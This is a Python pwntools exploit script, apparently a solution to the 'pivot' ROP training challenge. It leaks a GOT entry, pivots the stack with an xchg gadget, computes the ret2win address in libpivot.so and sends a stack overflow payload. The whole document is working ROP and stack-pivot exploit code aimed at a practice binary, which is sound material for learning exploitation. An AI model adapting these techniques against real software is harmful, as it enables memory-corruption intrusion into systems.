#!/bin/python3

from pwn import *

elf = ELF('./pivot')
p = process(elf.path)

libc_rop = ROP(elf.libc)
elf_rop = ROP(elf)

p.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ')
leak_addr = int(p.recvuntil(b'\n'), 16)

# I'll leak libc and get more gadgets from there to exexcve("/bin/sh",0,0)
pop_rdi_ret = elf_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax_ret = elf_rop.find_gadget(['pop rax', 'ret'])[0]
useful_gadget = 0x4009bd # xchg rsp, rax

chain = p64(elf.plt['foothold_function'])   \
    + p64(pop_rdi_ret)                      \
    + p64(elf.got['foothold_function'])     \
    + p64(elf.plt['puts'])                  \
    + p64(elf.sym['_start'])
p.sendlineafter(b'> ', chain)

pivot_chain = p64(pop_rax_ret)              \
    + p64(leak_addr)                        \
    + p64(useful_gadget)
payload = b'i' * 0x28 + pivot_chain
p.sendlineafter(b'> ', payload)


libpivot_elf = ELF('./libpivot.so')

# Capture the leak from libpivot and use it to find ret2win
p.recvuntil(b'foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n')
libpivot_leak = int.from_bytes(p.recv(6), 'little')

ret2win_addr = libpivot_leak - libpivot_elf.sym['foothold_function'] + libpivot_elf.sym['ret2win']
print("ret2win address: " + hex(ret2win_addr))

# Send the final payload to return to ret2win
p.recvuntil(b'Now please send your stack smash\n> ')

payload = b'i' * 0x28 + p64(ret2win_addr)
p.sendline(payload)

p.interactive()

